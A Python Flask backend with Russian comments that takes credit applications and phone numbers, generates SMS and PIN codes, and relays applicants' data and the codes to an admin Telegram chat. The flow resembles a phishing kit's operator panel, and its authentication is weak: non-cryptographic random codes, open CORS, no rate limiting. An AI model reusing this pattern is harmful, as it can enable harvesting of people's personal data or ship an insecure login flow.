import os
import asyncio
import random
from flask import Flask, request, jsonify
from flask_cors import CORS
from database import init_db, save_application, generate_session_id, get_auth_session, save_auth_session

app = Flask(__name__)
CORS(app)

init_db()

# Импортируем функцию бота
from bot import send_application_to_admin, bot, ADMIN_CHAT_ID

@app.route('/submit_credit_application', methods=['POST'])
def submit_credit_application():
    data = request.json
    
    if 'session_id' not in data or not data['session_id']:
        data['session_id'] = generate_session_id()
    
    save_application(data)
    
    # Отправляем уведомление админу
    asyncio.run(send_application_to_admin(data))
    
    return jsonify({"status": "ok", "session_id": data['session_id']})

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    data = request.json
    session_id = data['session_id']
    phone = data['phone']
    
    # Генерируем коды
    sms_code = str(random.randint(10000, 99999))
    pin_code = str(random.randint(1000, 9999))
    
    save_auth_session(session_id, phone, sms_code, pin_code)
    
    # Отправляем админу
    async def send():
        await bot.send_message(
            ADMIN_CHAT_ID,
            f"📱 <b>ЗАПРОС АВТОРИЗАЦИИ</b>\n\n"
            f"🆔 Сессия: <code>{session_id}</code>\n"
            f"📞 Телефон: {phone}\n\n"
            f"🔐 SMS-код: <code>{sms_code}</code>\n"
            f"🔢 PIN-код: <code>{pin_code}</code>",
            parse_mode="HTML"
        )
    
    asyncio.run(send())
    
    return jsonify({"status": "ok"})

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.json
    session_id = data['session_id']
    user_code = data['code']
    
    session = get_auth_session(session_id)
    
    if session and session[2] == user_code:
        return jsonify({"status": "ok", "next_step": "pin"})
    else:
        return jsonify({"status": "error", "message": "Неверный код"})

@app.route('/submit_pin', methods=['POST'])
def submit_pin():
    data = request.json
    session_id = data['session_id']
    user_pin = data['pin']
    
    session = get_auth_session(session_id)
    
    if session and session[3] == user_pin:
        async def send():
            await bot.send_message(
                ADMIN_CHAT_ID,
                f"✅ <b>АВТОРИЗАЦИЯ УСПЕШНА!</b>\n\n🆔 Сессия: <code>{session_id}</code>",
                parse_mode="HTML"
            )
        asyncio.run(send())
        return jsonify({"status": "ok", "authorized": True})
    else:
        return jsonify({"status": "error", "message": "Неверный PIN"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
